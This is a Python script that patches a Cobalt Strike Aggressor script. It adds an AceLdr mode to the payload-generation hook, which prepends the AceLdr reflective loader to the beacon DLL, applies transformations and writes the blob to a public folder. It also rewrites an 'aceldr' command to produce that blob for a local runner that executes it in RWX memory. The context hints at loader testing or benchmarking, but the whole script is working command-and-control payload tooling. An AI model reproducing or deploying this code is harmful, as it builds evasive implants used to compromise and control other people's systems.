# -*- coding: utf-8 -*-
r"""patch_aceldr.py - add the AceLdr prepend branch to the GENERATE hook
and fix the aceldr cna command (blob gen via hook + local probe runner)."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8-sig").read()

BS2 = chr(92) * 2   # doubled backslash for cna string literals
TAB = chr(9)
L = chr(10)

# 1. globals next to $udrl_o_path
anchor = '$udrl_o_path = "C:' + BS2 + BS2 + 'Administrator' + BS2 + BS2 + 'Desktop' + BS2 + BS2 + 'cobaltstrike' + BS2 + BS2 + 'ci-artifacts' + BS2 + BS2 + 'llvm-dist' + BS2 + BS2 + 'udrl' + BS2 + BS2 + 'ReflectiveLoader.x64.o";'
assert anchor in s, "udrl_o_path anchor missing"
s = s.replace(anchor, anchor + L +
    '$g_aceldr = 0;   # R2-2b: AceLdr prepend-mode flag (set by aceldr_gen)' + L +
    '$aceldr_bin = "C:' + BS2 + BS2 + 'Users' + BS2 + BS2 + 'Public' + BS2 + BS2 + 'aceldr' + BS2 + BS2 + 'AceLdr.x64.bin";', 1)

# 2. AceLdr branch at the top of the GENERATE hook beacon branch
hook_anchor = (TAB + 'if (indexOf($1, "beacon") >= 0 || indexOf($1, "winhttpb") >= 0' + L +
               TAB + TAB + '|| indexOf($1, "dnsb") >= 0 || indexOf($1, "pivot") >= 0 || indexOf($1, "extc2") >= 0) {')
if hook_anchor not in s:
    # tolerate single-line variant
    hook_anchor = TAB + 'if (indexOf($1, "beacon") >= 0 || indexOf($1, "winhttpb") >= 0 || indexOf($1, "dnsb") >= 0 || indexOf($1, "pivot") >= 0 || indexOf($1, "extc2") >= 0) {'
assert hook_anchor in s, "hook branch anchor missing"

aceldr_branch = (
    hook_anchor + L +
    TAB + TAB + '# R2-2b AceLdr prepend mode: blob = [raw ACELDR loader][beacon DLL]' + L +
    TAB + TAB + '# ($2 = size-0 customDLL; setup_strings first, transforms last -' + L +
    TAB + TAB + '#  official AceLdr.cna pattern). Blob lands in Public for the' + L +
    TAB + TAB + '#  probe_runner (flat VirtualAlloc + thread at blob[0]).' + L +
    TAB + TAB + 'if ($g_aceldr == 1 && $3 eq "x64") {' + L +
    TAB + TAB + TAB + '$ldr = readb(openf($aceldr_bin), -1);' + L +
    TAB + TAB + TAB + '$sdll = setup_strings($2);' + L +
    TAB + TAB + TAB + '$blob = $ldr . $sdll;' + L +
    TAB + TAB + TAB + '$out = setup_transformations($blob, $3);' + L +
    TAB + TAB + TAB + 'writeb(openf(">C:' + BS2 + BS2 + 'Users' + BS2 + BS2 + 'Public' + BS2 + BS2 + 'aceldr' + BS2 + BS2 + 'aceldr_blob.bin"), $out);' + L +
    TAB + TAB + TAB + 'println("[UDRL-ACELDR] ldr=" . strlen($ldr) . " dll=" . strlen($sdll) . " blob=" . strlen($out));' + L +
    TAB + TAB + TAB + 'return $out;' + L +
    TAB + TAB + '}' + L
)
s = s.replace(hook_anchor, aceldr_branch, 1)

# 3. replace the old aceldr command body (blob gen, not bdll_spawn)
old_cmd_start = (TAB + 'else if ($cmd eq "aceldr") {' + L +
                 TAB + TAB + '# R2-2: AceLdr UDRL control test' + L)
i = s.find(old_cmd_start)
assert i > 0, "old aceldr command not found"
j = s.find('return;' + L + TAB + '}' + L, i)
assert j > i, "old aceldr command end not found"
j = j + len('return;' + L + TAB + '}' + L)

new_cmd = (
    TAB + 'else if ($cmd eq "aceldr") {' + L +
    TAB + TAB + '# R2-2b: AceLdr prepend blob via GENERATE hook, then' + L +
    TAB + TAB + '# deploy through probe_runner (flat RWX + thread at blob[0])' + L +
    TAB + TAB + '$g_aceldr = 1;' + L +
    TAB + TAB + '$null = artifact_payload($a1, "dll", "x64");' + L +
    TAB + TAB + '$g_aceldr = 0;' + L +
    TAB + TAB + '$bp = "C:' + BS2 + BS2 + 'Users' + BS2 + BS2 + 'Public' + BS2 + BS2 + 'aceldr' + BS2 + BS2 + 'aceldr_blob.bin";' + L +
    TAB + TAB + 'if (-exists $bp) {' + L +
    TAB + TAB + TAB + '$b = readb(openf($bp), -1);' + L +
    TAB + TAB + TAB + 'blog($bid, "aceldr: blob ready " . strlen($b) . "B - run probe_runner locally");' + L +
    TAB + TAB + '} else {' + L +
    TAB + TAB + TAB + 'blog($bid, "aceldr: hook did not produce blob");' + L +
    TAB + TAB + '}' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)
s = s[:i] + new_cmd + s[j:]

io.open(P, "w", encoding="utf-8-sig", newline="").write(s)
print("patched: globals + hook branch + aceldr command")
